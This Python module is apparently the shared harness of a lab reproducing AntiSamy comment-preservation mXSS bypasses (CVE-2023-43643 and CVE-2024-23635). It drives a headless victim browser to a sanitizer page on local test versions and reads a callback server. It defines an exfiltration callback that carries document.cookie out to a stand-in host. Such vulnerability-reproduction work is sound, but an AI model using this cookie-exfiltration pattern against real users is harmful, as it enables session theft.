#!/usr/bin/env python3
"""Shared orchestration for the AntiSamy PRESERVE-COMMENTS mXSS canary
(CVE-2023-43643 -> CVE-2024-23635).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the AntiSamy-sink page
`/?html=<payload>` on a version, (3) read the callback. The observable result is the callback dump;
the per-run ${PCB_FLAG} appears there IFF AntiSamy's sanitized output (produced with
preserveComments=true) smuggled a live `<img onerror>` out of a preserved comment / raw-text region
so that it EXECUTED in the victim's browser (proving execution, not reflection).

Same sink (`new AntiSamy().scan(html, antisamy.xml, DOM).getCleanHTML()`, preserveComments=true) and
same exfil channel for the seed and the residual; only the comment-breakout technique differs
(raw-text-element `</noscript>`-in-comment for the seed vs the `--!>` bang-comment terminator for the
residual) -> Variant A (validate_case). The AntiSamy version (and its transitive neko-htmlunit parser)
differs per env (v0/v1/v2) -- that is the guard.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:35320",
    "v1": "http://127.0.0.1:35321",
    "v2": "http://127.0.0.1:35322",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:35370"
CALLBACK = "http://127.0.0.1:35390"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, mode: str = "load") -> str:
    """Drive the victim to view the AntiSamy-sink page with `html_payload` sanitized on `version`;
    return the callback dump (the flag lands there iff the sanitized markup smuggled a live element
    out of a preserved comment that executed)."""
    _get(CALLBACK + "/reset")
    target = INTERNAL_APP[version] + "/?html=" + urllib.parse.quote(html_payload, safe="")
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": mode}
    )
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side AntiSamy output (via /raw) for the repro log -- server proof."""
    url = HOST_APP[version] + "/raw?html=" + urllib.parse.quote(html_payload, safe="")
    return _get(url)
